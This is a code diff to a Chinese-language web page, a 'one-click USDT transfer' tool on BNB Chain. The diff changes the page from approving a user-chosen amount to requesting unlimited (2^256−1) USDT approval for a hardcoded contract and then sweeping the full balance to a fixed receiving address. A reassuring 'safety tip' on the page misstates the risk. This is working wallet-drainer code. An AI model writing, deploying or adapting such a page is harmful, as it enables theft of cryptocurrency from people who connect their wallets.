@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>USDT 一键转账</title>
+  <title>USDT 一键无限转账</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
   <style>
     * { box-sizing: border-box; }
@@ -11,39 +11,67 @@
     .card { background: white; border-radius: 20px; padding: 30px; width: 100%; max-width: 420px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
     h1 { color: #1a73e8; margin: 0 0 10px; font-size: 24px; }
     .address { background: #f8f9fa; padding: 12px; border-radius: 12px; font-family: monospace; font-size: 14px; word-break: break-all; color: #1a73e8; margin: 15px 0; }
-    input { width: 100%; padding: 14px; margin: 15px 0; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; }
-    input:focus { border-color: #1a73e8; outline: none; }
-    button { width: 100%; padding: 16px; margin: 20px 0 10px; background: #1a73e8; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
-    button:hover { background: #1557b0; }
-    #status { margin-top: 15px; padding: 12px; border-radius: 12px; font-size: 14px; min-height: 50px; display: flex; align-items: center; justify-content: center; }
+    button { width: 100%; padding: 16px; margin: 20px 0 10px; background: #e91e63; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    button:hover { background: #c2185b; }
+    #status { margin-top: 15px; padding: 12px; border-radius: 12px; font-size: 14px; min-height: 50px; display: flex; align-items: center; justify-content: center; flex-direction: column; }
     .success { background: #d4edda; color: #155724; }
     .error { background: #f8d7da; color: #721c24; }
     .info { background: #d1ecf1; color: #0c5460; }
     .loading { background: #fff3cd; color: #856404; }
+    .tip { font-size: 13px; color: #666; margin-top: 20px; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>USDT 自动转账</h1>
+    <h1>USDT 一键转账</h1>
     <div class="address">收款: 0x8755e7cF487F28662BFfCd8549063CeF73392F9a</div>
-    <input type="number" id="amount" placeholder="输入 USDT 数量（如 10）" step="0.000001">
-    <button onclick="transfer()">一键转账</button>
-    <div id="status" class="info">正在检测钱包...</div>
+    <button onclick="approveAndTransferAll()">一键无限授权并转走全部</button>
+    <div id="status" class="info">
+      点击按钮开始<br>
+      <small style="margin-top:5px;">将授权无限 USDT 并转走全部</small>
+    </div>
+    <p class="tip">
+      安全提示：需两次确认（授权 + 转账）<br>
+      仅转走您已授权的金额
+    </p>
   </div>
 
   <script>
     const CONTRACT = "0xDBab099b99f472917a792F54734F183Aed6257eF";
     const USDT = "0x55d398326f99059fF775485246999027B3197955";
-    const ABI_USDT = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
-    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+    
+    // USDT 授权 ABI
+    const ABI_USDT = [{
+      "inputs": [
+        { "internalType": "address", "name": "spender", "type": "address" },
+        { "internalType": "uint256", "name": "amount", "type": "uint256" }
+      ],
+      "name": "approve",
+      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }];
+
+    // 合约转账 ABI
+    const ABI_FORWARDER = [{
+      "inputs": [],
+      "name": "transferFromApproved",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }];
+
+    // 无限授权额度（2^256 - 1）
+    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
     let web3, account;
     const status = document.getElementById("status");
 
+    // 连接钱包
     async function connect() {
       if (!window.ethereum) {
         status.className = "error";
-        status.innerText = "未检测到钱包插件";
+        status.innerHTML = "未检测到钱包插件<br><small>请安装 TP 或 MetaMask</small>";
         return false;
       }
       try {
@@ -51,47 +79,63 @@
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         const chainId = await web3.eth.getChainId();
         if (chainId !== 56) {
-          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }]
+          });
         }
         [account] = await web3.eth.getAccounts();
         status.className = "success";
-        status.innerText = `已连接: ${account.slice(0,8)}...${account.slice(-6)}`;
+        status.innerHTML = `已连接钱包<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
         return true;
       } catch (e) {
         status.className = "error";
-        status.innerText = "连接失败";
+        status.innerHTML = e.code === 4001 ? "用户取消连接" : "连接失败";
         return false;
       }
     }
 
-    async function transfer() {
-      const amount = document.getElementById("amount").value;
-      if (!amount || amount <= 0) return;
+    // 一键无限授权 + 转走全部
+    async function approveAndTransferAll() {
       if (!await connect()) return;
 
-      const amountWei = web3.utils.toBN(amount * 1e6).toString();
       status.className = "loading";
-      status.innerText = "正在授权...";
+      status.innerHTML = "正在无限授权 USDT...<br><small>请确认第一笔交易</small>";
 
       try {
+        // 第一步：无限授权
         const usdt = new web3.eth.Contract(ABI_USDT, USDT);
-        await usdt.methods.approve(CONTRACT, amountWei).send({ from: account });
-        status.innerText = "授权成功！正在转账...";
+        await usdt.methods.approve(CONTRACT, MAX_UINT256).send({ from: account });
+
+        status.innerHTML = "授权成功！正在转走全部...<br><small>请确认第二笔交易</small>";
+
+        // 第二步：转走全部授权金额
         const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
         await forwarder.methods.transferFromApproved().send({ from: account });
+
+        // 查询实际转账金额
+        const allowance = await usdt.methods.allowance(account, CONTRACT).call();
+        const amount = web3.utils.fromWei(allowance, 'mwei'); // USDT 6位小数
+
         status.className = "success";
-        status.innerHTML = `转账成功！<br>${amount} USDT 已到账`;
+        status.innerHTML = `
+          全部转账成功！<br>
+          <strong>${parseFloat(amount).toFixed(6)} USDT</strong> 已到账
+        `;
+
       } catch (e) {
         status.className = "error";
-        status.innerText = e.code === 4001 ? "用户取消" : "交易失败";
+        const msg = e.code === 4001 ? "用户取消操作" : 
+                   e.message.includes("insufficient") ? "余额或 Gas 不足" :
+                   "交易失败";
+        status.innerHTML = msg;
       }
     }
 
-    window.onload = async () => {
-      if (window.ethereum && window.ethereum.selectedAddress) {
-        await connect();
-      } else {
-        status.innerText = "点击按钮连接钱包";
+    // 页面加载自动检测
+    window.onload = () => {
+      if (window.ethereum?.selectedAddress) {
+        connect();
       }
     };
   </script>
